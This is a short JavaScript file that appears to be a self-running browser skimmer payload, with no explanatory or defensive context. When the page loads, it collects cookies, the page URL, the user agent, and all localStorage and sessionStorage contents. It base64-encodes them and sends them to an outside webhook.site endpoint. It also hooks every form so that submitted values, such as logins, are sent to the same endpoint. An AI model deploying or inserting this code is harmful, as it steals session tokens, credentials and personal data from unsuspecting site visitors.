function sendData(data, type) {
  const webhook = "https://webhook.site/b80abe48-e7fe-4eb7-b75a-5435b247a474";
  const encodedData = btoa(JSON.stringify(data));
  fetch(`${webhook}?type=${type}&data=${encodedData}`);
}

function collectEnvironmentInfo() {
  const info = {
    cookies: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent,
    localStorage: {},
    sessionStorage: {}
  };
  
  // Grab localStorage items
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    info.localStorage[key] = localStorage.getItem(key);
  }
  
  // Grab sessionStorage items
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    info.sessionStorage[key] = sessionStorage.getItem(key);
  }
  
  return info;
}

function hookForms() {
  document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
      const formData = {};
      new FormData(form).forEach((value, key) => {
        formData[key] = value;
      });
      sendData(formData, 'form');
    });
  });
}

// Main execution
(function() {
  // Send initial environment data
  const envInfo = collectEnvironmentInfo();
  sendData(envInfo, 'initial');
  
  // Hook into forms to capture submissions
  hookForms();
  
})();
